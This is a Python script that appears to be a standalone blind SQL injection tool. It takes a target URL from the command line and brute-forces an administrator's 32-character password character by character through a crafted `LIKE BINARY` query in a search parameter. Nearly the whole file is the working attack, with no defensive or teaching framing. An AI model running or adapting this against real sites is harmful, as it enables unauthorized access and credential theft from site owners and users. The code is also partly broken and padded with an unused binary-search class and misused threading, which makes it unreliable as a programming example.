import re
import sys
import string
import requests
import threading

# common headers to use during injection into the website

headers =  {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
        'Accept-Language': 'en-us',
        'Accept-Encoding': 'text/html;q=0.9',
        'Keep-Alive': '300',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
}

class BinarySearch(object):
    """
        performs a search for a list of  items
    """

    def __init__(self, *args, **kwargs):
        pass

    def binary_search(item_list, item):
        first = 0
        last = len(item_list)-1
        found = False
        while( first<=last and not found):
            mid = (first + last)//2
            if item_list[mid] == item :
                found = True
            else:
                if item < item_list[mid]:
                    last = mid - 1
                else:
                    first = mid + 1
        return found

# a class that handle error
class ExecutionError(Exception):
    """
        Error handling with errors inherited from Exception class
    """

    def __init__(self, args):
        self.args = args

    # return a canonical representation of the arguments
    def __str__(self):
        return "{}".format(self.args)

"""
    Injection class , that handles blind injection into the site provided at 
    the command line. 
"""

class Injection(threading.Thread):
    def __init__(self, *args, **kwargs):
        self.password = ''
        self.domain = ""
        self.chars = string.ascii_letters + string.digits
        self.guess = "admin"

    def is_alive(self, site):
        """
            check to see if a site is live
        """
        try:
            return requests.get(site).status_code == 200
        except Exception:
            pass

    def inject(self):
        # all the characters have a length of 32
        try:
            if self.is_alive(self.domain):
                print("Site is live ..")
                for i in range(32):
                    for ch in self.chars:
                        sql = "{0}?search=admin' AND password LIKE BINARY '{1}{2}".format(self.domain, self.password, ch)
                        print("Executing ... {}".format(sql))
                        if requests.get(sql).content.find(self.guess) != -1:
                            self.password += ch
                            print("Password Found .. {}".format(self.password))
                            break
                        print(self.password)
            else:
                print("Use a different site ...")
        except ExecutionError as e:
            print(str(e))


    @property
    def blind(self):
        """
            method to inject the url with a query
        """
        print("Performing blind sql injection on {}".format(self.domain))
        return self.inject()

    def run(self, domain):
        """
            Run method for the start of the application, 
            accepts the domain as an argument.
        """

        url = re.findall('(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', domain)
        if len(url) >= 1:
            for r in url:
                self.domain = r
        else:
            print("Provide a valid url ie www.example.com ")
        self.blind  # calling a method


threads = []

# begin of the execution of the program
if __name__ == "__main__":
    injection = Injection()
    if len(sys.argv) > 1:
        domain_name = sys.argv[1]
        try:
            t = threading.Thread(target=injection.run(domain_name))
            threads.append(t)
            t.start()
            for thread in threads:
                thread.join()

        except ExecutionError as e:
            print(str(e))

    else:
        print("Provide the domain name ! ")